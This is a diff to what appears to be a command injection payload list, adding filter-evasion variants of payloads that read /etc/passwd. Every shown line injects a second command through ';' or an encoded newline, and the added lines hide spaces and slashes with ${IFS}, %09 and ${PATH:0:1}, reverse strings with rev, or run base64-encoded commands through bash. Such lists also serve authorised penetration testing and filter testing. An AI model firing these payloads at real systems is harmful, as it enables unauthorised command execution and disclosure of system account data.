@@ -1,6 +1,60 @@
 ;cat /etc/passwd
 ;head /etc/passwd
 ;tail /etc/passwd
+;cat%09/etc/passwd
+;head%09/etc/passwd
+;tail%09/etc/passwd
 %0acat /etc/passwd
 %0ahead /etc/passwd
 %0atail /etc/passwd
+;cat${IFS}/etc/passwd
+;head${IFS}/etc/passwd
+;tail${IFS}/etc/passwd
+%0acat${IFS}/etc/passwd
+%0ahead${IFS}/etc/passwd
+%0atail${IFS}/etc/passwd
+${LS_COLORS:10:1}cat /etc/passwd
+${LS_COLORS:10:1}head /etc/passwd
+${LS_COLORS:10:1}tail /etc/passwd
+${LS_COLORS:10:1}cat${IFS}/etc/passwd
+${LS_COLORS:10:1}head${IFS}/etc/passwd
+${LS_COLORS:10:1}tail${IFS}/etc/passwd
+${LS_COLORS:10:1}cat ${PATH:0:1}etc${PATH:0:1}passwd
+${LS_COLORS:10:1}head ${PATH:0:1}etc${PATH:0:1}passwd
+${LS_COLORS:10:1}tail ${PATH:0:1}etc${PATH:0:1}passwd
+${LS_COLORS:10:1}cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+${LS_COLORS:10:1}head${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+${LS_COLORS:10:1}tail${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+${LS_COLORS:10:1}cat%09/etc/passwd
+${LS_COLORS:10:1}head%09/etc/passwd
+${LS_COLORS:10:1}tail%09/etc/passwd
+%0a{cat,/etc/passwd}
+%0a{head,/etc/passwd}
+%0a{tail,/etc/passwd}
+;{cat,${PATH:0:1}etc${PATH:0:1}passwd}
+;{head,${PATH:0:1}etc${PATH:0:1}passwd}
+;{tail,${PATH:0:1}etc${PATH:0:1}passwd}
+%0a{cat,${PATH:0:1}etc${PATH:0:1}passwd}
+%0a{head,${PATH:0:1}etc${PATH:0:1}passwd}
+%0a{tail,${PATH:0:1}etc${PATH:0:1}passwd}
+;$(rev<<<'dwssap/cte/ tac')
+;$(rev<<<'dwssap/cte/ daeh')
+;$(rev<<<'dwssap/cte/ liat')
+${LS_COLORS:10:1}$(rev<<<'dwssap/cte/ tac')
+${LS_COLORS:10:1}$(rev<<<'dwssap/cte/ daeh')
+${LS_COLORS:10:1}$(rev<<<'dwssap/cte/ liat')
+;bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
+;bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
+;bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
+%0abash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
+%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
+%0abash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
+;bash<<<$(base64 -d<<<aGVhZCAvZXRjL3Bhc3N3ZA==)
+;bash<<<$(base64%09-d<<<aGVhZCAvZXRjL3Bhc3N3ZA==)
+;bash<<<$(base64${IFS}-d<<<aGVhZCAvZXRjL3Bhc3N3ZA==)
+%0abash<<<$(base64 -d<<<aGVhZCAvZXRjL3Bhc3N3ZA==)
+%0abash<<<$(base64%09-d<<<aGVhZCAvZXRjL3Bhc3N3ZA==)
+%0abash<<<$(base64${IFS}-d<<<aGVhZCAvZXRjL3Bhc3N3ZA==)
+;bash<<<$(base64 -d<<<dGFpbCAvZXRjL3Bhc3N3ZA==)
+;bash<<<$(base64%09-d<<<dGFpbCAvZXRjL3Bhc3N3ZA==)
+;bash<<<$(base64${IFS}-d<<<dGFpbCAvZXRjL3Bhc3N3ZA==)
